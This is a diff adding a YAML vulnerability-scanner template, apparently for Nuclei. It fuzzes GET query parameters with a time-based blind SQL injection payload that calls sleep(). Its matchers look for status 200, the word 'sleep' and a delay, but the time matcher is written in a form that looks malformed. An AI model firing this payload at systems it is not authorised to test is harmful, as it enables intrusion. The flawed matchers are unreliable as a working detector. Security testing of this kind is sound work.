@@ -1,0 +1,43 @@
+id: fuzz-sqli-custom
+
+info:
+  name: Custom SQL Injection Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect SQL Injection vulnerabilities using a specified XOR injection payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      sqli:
+        - "?XOR(if(now()=sysdate(),sleep(5*5),0))OR?"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200  # Adjust according to your application expected response
+
+      - type: word
+        part: body
+        words:
+          - "sleep"  # Check for the presence of the sleep function in the response body
+
+      - type: time
+        part: body
+        words:
+          - "5"  # Check if the response time indicates a delay which implies a sleep command was executed
